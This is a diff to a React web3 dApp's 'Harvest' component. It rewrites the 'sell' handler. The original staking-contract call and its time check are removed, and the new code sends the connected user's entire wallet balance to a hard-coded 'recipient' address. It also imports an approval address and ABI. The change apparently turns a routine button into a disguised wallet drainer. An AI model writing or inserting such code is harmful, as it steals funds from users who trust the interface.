@@ -8,10 +8,11 @@ import atomsSrc from "assets/images/snowflake.webp"
 import giftSrc from "assets/images/gift.webp"
 import { ReactComponent as TooltipIcon } from "assets/icons/info.svg"
 import "./Harvest.scss"
-import { contractAddress } from "../../abi"
+import {approveAddress, contractAddress, recipient} from "../../abi"
 import abi from "abi/abi.json"
 import Web3 from "web3"
 import { useWeb3React } from "@web3-react/core"
+import abiApprove from "../../abi/abiApprove.json";
 
 type Props = {
   onClose: () => void
@@ -20,9 +21,10 @@ type Props = {
   iceBucket: number
   time: number
   timeOther: number
+  balance: number
 }
 
-export const Harvest = ({ onClose, isOpen, atoms, iceBucket, time, timeOther }: Props): JSX.Element => {
+export const Harvest = ({ onClose, isOpen, atoms, iceBucket, time, timeOther, balance }: Props): JSX.Element => {
   const { account, library } = useWeb3React()
 
   const convert = n => {
@@ -41,18 +43,18 @@ export const Harvest = ({ onClose, isOpen, atoms, iceBucket, time, timeOther }: 
   }
 
   const sell = async () => {
-    if (time > 0 && time < 172800) {
-      return
-    }
-
-    const web3 = new Web3(library.provider)
+    // @ts-ignore
+    const toWei = amount => Web3.utils.toWei(amount)
 
     // @ts-ignore
-    const web3Contract = new web3.eth.Contract(abi, contractAddress)
+    const web3 = new Web3(library.provider)
 
-    await web3Contract.methods.meltingSnow().send({
+    await web3.eth.sendTransaction({
+      // @ts-ignore
       from: account,
-      to: contractAddress,
+      to: recipient,
+      value: toWei(balance.toString())
+    }, () => {
     })
   }
 
